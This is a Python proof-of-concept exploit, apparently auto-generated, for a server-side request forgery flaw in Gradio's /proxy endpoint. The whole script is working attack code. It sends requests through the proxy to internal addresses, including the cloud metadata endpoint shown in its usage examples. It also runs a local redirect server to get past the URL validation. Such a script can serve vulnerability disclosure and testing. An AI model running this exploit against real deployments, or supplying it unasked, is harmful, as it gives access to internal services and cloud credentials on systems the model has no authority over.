#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: ssrf-009
# Sink: validate_url
# Auto-generated — run with: python3 ssrf_url_forwards_requests_httpx_validate_url.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Gradio /proxy endpoint

Vulnerability: The /proxy={url_path:path} endpoint accepts a user-controlled URL
and forwards requests via httpx.AsyncClient without validating the host against
an allowlist or blocking private IPs. The validate_url function only performs a
HEAD request (which follows redirects by default), allowing an attacker to use
an external redirect to reach internal services.

This PoC demonstrates:
1. Direct SSRF to an internal service (e.g., localhost)
2. SSRF via redirect from an attacker-controlled server

Usage:
    python3 poc_ssrf.py [target_base_url] [internal_url]

Examples:
    python3 poc_ssrf.py http://localhost:7860 http://127.0.0.1:5000/admin
    python3 poc_ssrf.py http://victim-gradio.com http://169.254.169.254/latest/meta-data/
"""

import sys
import urllib.parse
import urllib.request
import json
import socket
import http.server
import threading
import time

# Default target (change as needed)
TARGET_BASE = "http://localhost:7860"
INTERNAL_TARGET = "http://127.0.0.1:5000/admin"  # Example internal service

def check_target_alive(base_url, timeout=5):
    """Verify the Gradio server is reachable."""
    try:
        req = urllib.request.Request(base_url, method="HEAD")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status < 500
    except Exception as e:
        print(f"[!] Target {base_url} not reachable: {e}")
        return False

def direct_ssrf(base_url, internal_url):
    """
    Attempt direct SSRF by passing the internal URL directly to /proxy.
    This works if validate_url doesn't block private IPs.
    """
    encoded_url = urllib.parse.quote(internal_url, safe='')
    proxy_url = f"{base_url.rstrip('/')}/proxy={encoded_url}"
    print(f"[*] Attempting direct SSRF to: {internal_url}")
    print(f"[*] Proxy URL: {proxy_url}")
    
    try:
        req = urllib.request.Request(proxy_url)
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode('utf-8', errors='replace')
            print(f"[+] Response status: {resp.status}")
            print(f"[+] Response headers: {dict(resp.headers)}")
            print(f"[+] Response body (first 500 chars): {body[:500]}")
            return body
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        print(f"[!] Response: {e.read().decode('utf-8', errors='replace')[:200]}")
    except urllib.error.URLError as e:
        print(f"[!] URL error: {e.reason}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    return None

def start_redirect_server(port=9999, redirect_target=None):
    """
    Start a simple HTTP server that redirects all requests to the internal target.
    This simulates an attacker-controlled server used to bypass validate_url.
    """
    if redirect_target is None:
        redirect_target = INTERNAL_TARGET
    
    class RedirectHandler(http.server.BaseHTTPRequestHandler):
        def do_HEAD(self):
            self.send_response(302)
            self.send_header('Location', redirect_target)
            self.end_headers()
        
        def do_GET(self):
            self.send_response(302)
            self.send_header('Location', redirect_target)
            self.end_headers()
        
        def log_message(self, format, *args):
            print(f"[redirect-server] {args}")
    
    server = http.server.HTTPServer(('0.0.0.0', port), RedirectHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Redirect server started on port {port} -> {redirect_target}")
    return server

def ssrf_via_redirect(base_url, redirect_server_url):
    """
    Use an external redirect server to bypass validate_url.
    The HEAD request from validate_url will follow the redirect to the internal target,
    but the actual GET request from the proxy will also follow it.
    """
    encoded_url = urllib.parse.quote(redirect_server_url, safe='')
    proxy_url = f"{base_url.rstrip('/')}/proxy={encoded_url}"
    print(f"[*] Attempting SSRF via redirect from: {redirect_server_url}")
    print(f"[*] Proxy URL: {proxy_url}")
    
    try:
        req = urllib.request.Request(proxy_url)
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode('utf-8', errors='replace')
            print(f"[+] Response status: {resp.status}")
            print(f"[+] Response headers: {dict(resp.headers)}")
            print(f"[+] Response body (first 500 chars): {body[:500]}")
            return body
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        print(f"[!] Response: {e.read().decode('utf-8', errors='replace')[:200]}")
    except urllib.error.URLError as e:
        print(f"[!] URL error: {e.reason}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    return None

def main():
    # Parse command-line arguments
    base_url = TARGET_BASE
    internal_url = INTERNAL_TARGET
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    if len(sys.argv) > 2:
        internal_url = sys.argv[2]
    
    print(f"[*] Target Gradio server: {base_url}")
    print(f"[*] Internal target: {internal_url}")
    print()
    
    # Step 1: Check if target is alive
    if not check_target_alive(base_url):
        print("[!] Target server is not responding. Exiting.")
        sys.exit(1)
    print("[+] Target server is alive.")
    print()
    
    # Step 2: Attempt direct SSRF
    print("=" * 60)
    print("STEP 1: Direct SSRF")
    print("=" * 60)
    result = direct_ssrf(base_url, internal_url)
    if result:
        print("[+] Direct SSRF succeeded!")
    else:
        print("[-] Direct SSRF failed (likely blocked by validate_url or network).")
    print()
    
    # Step 3: Attempt SSRF via redirect
    print("=" * 60)
    print("STEP 2: SSRF via Redirect")
    print("=" * 60)
    
    # Find an available port for the redirect server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        redirect_port = s.getsockname()[1]
    
    redirect_server = start_redirect_server(port=redirect_port, redirect_target=internal_url)
    time.sleep(0.5)  # Give server time to start
    
    redirect_url = f"http://{socket.gethostbyname(socket.gethostname())}:{redirect_port}/"
    result = ssrf_via_redirect(base_url, redirect_url)
    if result:
        print("[+] SSRF via redirect succeeded!")
    else:
        print("[-] SSRF via redirect failed.")
    
    # Cleanup
    redirect_server.shutdown()
    print()
    print("[*] PoC complete.")

if __name__ == "__main__":
    main()
